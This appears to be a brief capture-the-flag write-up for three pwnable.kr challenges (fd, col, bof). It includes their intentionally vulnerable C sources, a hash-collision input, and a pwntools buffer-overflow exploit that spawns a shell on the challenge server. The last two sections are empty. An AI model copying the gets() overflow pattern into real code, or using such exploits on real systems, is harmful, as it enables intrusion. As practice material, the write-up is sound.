# pwn.kr

## 01 fd
fd == 	0 -> stdin;
	1 -> stdout;
	2 -> stderror;

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```
## 02 col
```sh
./col `python -c "print '\x01' * 16  + '\xE8' + '\x05' + '\xd9' + '\x1D' " `
```
hash collision, just find the hash value and fake an input to reach the value.

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```
## 03 bof
bof vulnerability with out limitation.
A backdoor, overwriting the local `key` valuable is all you need.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

here is the exp:
```py
#!/bin/python3

from pwn import *

# io = process('./bof')
io = remote('pwnable.kr', 9000)
# elf = ELF('./bof')

payload = b''
payload += p32(0xcafebabe) * 20

io.sendlineafter(b'me : ', payload)

io.interactive()
```

## 04 

## 05
